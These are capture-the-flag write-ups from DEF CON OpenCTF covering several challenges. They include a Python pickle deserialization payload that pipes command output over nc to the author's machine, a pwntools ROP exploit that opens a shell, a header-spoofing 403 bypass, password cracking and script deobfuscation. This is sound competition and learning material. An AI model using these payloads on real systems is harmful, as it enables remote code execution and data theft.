# OpenCTF

This year Shell Collecting Club showed up late, but strong to the DEF CON OpenCTF. We are under a time crunch for getting in these writeups. They will be revised a bit better later on. So we apologize for the brevity and lack of screen shots for the time being :)


## Solenya

### Web 300

When navigating to the supplied URL for the challenge, we were greeted with a really basic page that just had a JPG of Pickle Rick from Rick and Morty. There weren't any links that I can recall, so I tried to begin enumerating the server by hand to see if I could derive more information about the service.

I tried to go to *domain*/index.html to see what that would yield.

When doing so, I was greeted with a Django error page (Debug was set to True in the `setting.py` file!) that notified me that I had tried to navigate to a route that wasn't defined in `urls.py`. This error page also lets you know what the defined routes are.

There were 2 routes in particular that were interesting. The first was `/fingerprint/` and the second was `/wubbalubbadubdub/`.

In `/fingerprint/`, we were delivered a different Ricky and Morty image.

However, in `/wubbalubbadubdub/`, we were presented with a standard Django login page.

After trying for a bit to figure out what the creds might be, this attempt was abandoned and I started looking more at the web requests happening in the background.

I noticed a call to `/fingerprint/` with a large amount of POST data. This POST data was the output of javascript fingerprinting script that was being ran through `pickle.dumps` prior to being sent over, along with a `Token` HTTP header with the value `SSdtIFBpY2tsZSBSaWNrIQ==` (b64decode -> "I'm Pickle Rick!"). 

There were a bunch of references to Pickle Rick in this website, and python pickling is known to be dangerous. Therefore, it made sense that we could try to use this for our attack.

We assumed that the pickled POST data (literally called `pickle_data`), was unpickled on the `/fingerprint/` view.

So now, it was time to see if that worked.

I started a nc listener on my laptop (`nc -l -p 42069`) and sent some pickled data that would call `os.system` with some data piped into `nc`.

Due to the rush we were under, I didn't script up the entire payload delivery, but instead set a breakpoint in the JS debugger in the brower before the POST request was sent, and then modified the `pickle_data` variable to contain my generated payload.

Here was the test:

```
import requests
import cPickle
import subprocess
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('{} | nc {} {}'.format('ls', '172.31.127.66', '42069'),),)

print cPickle.dumps(Exploit())
```

When I sent this data, I received the output of `ls` in my `nc` listener! We had RCE!

Now I just massaged the payload a bit, finding the flag in a file on the server.

You can read more about the badness of Python pickle [here](https://blog.nelhage.com/2011/03/exploiting-pickle/)


## babys_first_rop

### pwn

This was a pretty simple ROP challenge. 

From main, the binary calls a function that loads a bunch of data into a place labeled `gadgets` then calls a function called `vuln`.

This `vuln` function does a `read()` of 0x100 bytes into a buffer of size `0x50` creating an obvious overflow.

The stack was not executable.

The binary natively gave us a `pop rdi` gadget and a `pop rsi, r15` gadget.

Our method was to call `read()` again on the section of memory called `gadgets` (since it was executable), and load some shellcode there, finally returning to it.

The only thing we needed was a `pop rdx` gadget, which we were able to find using this:

```
gdb-peda$ ropsearch "pop rdx" 
Searching for ROP gadget: 'pop rdx' in: binary ranges
0x0060118f : (b'5ac3')    pop rdx; ret
```

our final exploit is below:

```
from pwn import *

#p = process(['./babys_first_rop'])
p = remote('172.31.2.62', 47802)
context.arch = 'amd64'

def pad_payload(payload, size):
    n = size - len(payload)
    payload += 'A' * n
    return payload

if __name__ == '__main__':
    ADDR_READ = 0x4004d0
    SHELLCODE = asm(shellcraft.amd64.linux.sh())
    print len(SHELLCODE)
    payload = 'A' * 0x50
    payload += 'whocares'
    payload += p64(0x400793) # pop rdi
    payload += p64(0)
    payload += p64(0x400791) # pop rsi, pop r15
    payload += p64(0x601080) # buf
    payload += 'AAAAAAAA'    # who cares
    payload += p64(0x60118f) # pop rdx
    payload += p64(0x64)     # shellcode len
    payload += p64(ADDR_READ)
    payload += p64(0x601080)
    p.sendline(pad_payload(payload, 0xff))
    p.sendline(SHELLCODE)
    p.interactive()
```


## Forbidden Folly

### level 1

When navigating to the webpage, we get a `403 Forbidden` error.

Knowing that this was a 50 point challenge, we knew the solution would be simple.

One of the first things we did was to set the `X-Forwarded-For` header with the value of `127.0.0.1` (localhost), and tried the get request again.

The flag was in an HTML comment.


### level 2

The HTML page returned from level 1 was some type of monitoring console of servers. But this string was interesting:

`Tim placed a web terminal on the system for easy access, the location of that has been emailed to everyone who has access to this portal.`

Knowing that the domains listed in the monitoring panel were actual domains, we didn't try to attack those.

After spending way too much time analyzing the page, we decided to run, sigh, a brute force attack to enumerate some of the html paths on the server.

After some time, one finally hit: `/debug`.

When going there, there was an open directory listing with a file called `/debug/secret.txt`. This file contained the flag, and an email containing SSH creds for level 3.


### level 3

When sshing onto the server with the creds from level 2, we found a `secretpassword.zip` file in the home folder.

This zipfile was password protected.

We recovered the file, ran it though `zip2john` and finally `john the ripper`. After some time, the password was broken.

The password? `poopstinks`. Nice.

The contents of the zip file were jsut another password, presumably for another ssh user on the box. Listing the `/home/` directory, we saw a user named `hopper`.

At this point, its important to note that our user, `chad`, was not a sudoer.

When sshing onto the server with the user `hopper` and the password recovered from the zip, the first thing we tried was `sudo su`, and that worked. 

The flag was in the `/root` directory.


## Obfu-150

This challenge was just an obfuscated python script with a cryptic hint: `we found the note 'divided we fall' near the floppy that this was found on`, or something to that effect.

This is the original script:

```
a=b'\x62\x71\x65\x64\x65\x66\x67\x68\x6b\x71\x65\x64\x66\x67\x68\x71\x65\x64\x6d\x70\x70\x6d\x6a\x6b\x6e\x70\x6b\x61\x64\x73\x66\x61\x73\x64\x66\x61\x73\x64\x66\x6b\x61\x73\x7a'.decode()
b=( 0.8571428571428571, 0.4424778761061947, 0.7326732673267327, 1.09, 0.9900990099009901, 0.8627450980392157, 0.7572815533980582, 1.0192307692307692, 0.8317757009345794, 0.7787610619469026, 0.8118811881188119, 1.12, 0.7549019607843137, 0.6893203883495146, 0.5096153846153846, 0.7522123893805309, 0.9801980198019802, 1.09, 0.6422018348623854, 1.0, 0.875, 1.0, 1.0188679245283019, 1.0934579439252337, 0.8181818181818182, 0.4375, 0.9345794392523364, 1.1443298969072164, 0.9, 0.7565217391304347, 0.8431372549019608, 1.1855670103092784, 0.8608695652173913, 1.19, 0.5980392156862745, 0.6288659793814433 )
i=ord('e');i=__import__(chr(i+((2++++(++-+(++2+1+4)-2++++++++++++(++-+2)++++++++++++++++++++++++++++++++++++1+++++++++++1+++++++++++++++++++++++++++++11++++++++++++++11+1+1+++1+-+0xf-++++-+1+-+-++++-++1++-+-++++-1++-+-++++-1++-+-++++-1+-+-+-+-+-+(1+1+1+1)--+-+-+-+-+-++++-+1-++-+-+-+-1+11+1+-0xb+1+1+1+1)+8+1++1++++1)+++++++++-----++++++++--+--++++1+++++++++1++1))+chr(i)); x=lambda x,e: filter(x.match, zip(sorted(e.__dir__()), range(len(e.__dir__()))));
z=34;c=0x10;d=196;e=258;f=119;n=19;h=24;d=32;e=39;r=14;s=10;q=15;e=lambda e,f:e.__class__.__getattribute__(e,sorted(e.__class__.__dir__(e))[f]);h=lambda c:c.__dir__.__self__.__class__.__getattribute__(c,sorted(c.__class__.__dir__(c))[0xa])
print(e(__import__(b'\x62\x61\x73\x65\x36\x34'.decode()),z)(globals()['__name__'].translate(__name__.maketrans("","",__name__)).join(map(lambda a,b:chr(int(h(ord(a).__float__())(b))%128), a,b)).encode()).decode())
```

After simplifying the script, we came up with this:

```
from base64 import b64encode

def foo(a,b):
    return chr(int(float(ord(a))/b)%128)

if __name__ == '__main__':
    a=b'\x62\x71\x65\x64\x65\x66\x67\x68\x6b\x71\x65\x64\x66\x67\x68\x71\x65\x64\x6d\x70\x70\x6d\x6a\x6b\x6e\x70\x6b\x61\x64\x73\x66\x61\x73\x64\x66\x61\x73\x64\x66\x6b\x61\x73\x7a'.decode()
    b=( 0.8571428571428571, 0.4424778761061947, 0.7326732673267327, 1.09, 0.9900990099009901, 0.8627450980392157, 0.7572815533980582, 1.0192307692307692, 0.8317757009345794, 0.7787610619469026, 0.8118811881188119, 1.12, 0.7549019607843137, 0.6893203883495146, 0.5096153846153846, 0.7522123893805309, 0.9801980198019802, 1.09, 0.6422018348623854, 1.0, 0.875, 1.0, 1.0188679245283019, 1.0934579439252337, 0.8181818181818182, 0.4375, 0.9345794392523364, 1.1443298969072164, 0.9, 0.7565217391304347, 0.8431372549019608, 1.1855670103092784, 0.8608695652173913, 1.19, 0.5980392156862745, 0.6288659793814433 )
    print(b64encode(''.join(map(foo, a,b)).encode()))
```

Using the `divided we fall` hint, we just changed it from division to multiplication and replaced the `b64encode` with `b64decode` which yielded this:

```
from base64 import b64encode, b64decode

def foo(a,b):
    return chr(int(float(ord(a))*b)%128)

if __name__ == '__main__':
    a=b'\x62\x71\x65\x64\x65\x66\x67\x68\x6b\x71\x65\x64\x66\x67\x68\x71\x65\x64\x6d\x70\x70\x6d\x6a\x6b\x6e\x70\x6b\x61\x64\x73\x66\x61\x73\x64\x66\x61\x73\x64\x66\x6b\x61\x73\x7a'.decode()
    b=( 0.8571428571428571, 0.4424778761061947, 0.7326732673267327, 1.09, 0.9900990099009901, 0.8627450980392157, 0.7572815533980582, 1.0192307692307692, 0.8317757009345794, 0.7787610619469026, 0.8118811881188119, 1.12, 0.7549019607843137, 0.6893203883495146, 0.5096153846153846, 0.7522123893805309, 0.9801980198019802, 1.09, 0.6422018348623854, 1.0, 0.875, 1.0, 1.0188679245283019, 1.0934579439252337, 0.8181818181818182, 0.4375, 0.9345794392523364, 1.1443298969072164, 0.9, 0.7565217391304347, 0.8431372549019608, 1.1855670103092784, 0.8608695652173913, 1.19, 0.5980392156862745, 0.6288659793814433 )
    print(b64decode(''.join(map(foo, a,b)).encode()))
```

and ultimated the flag: `Obfuscati0nTrainingWheels`

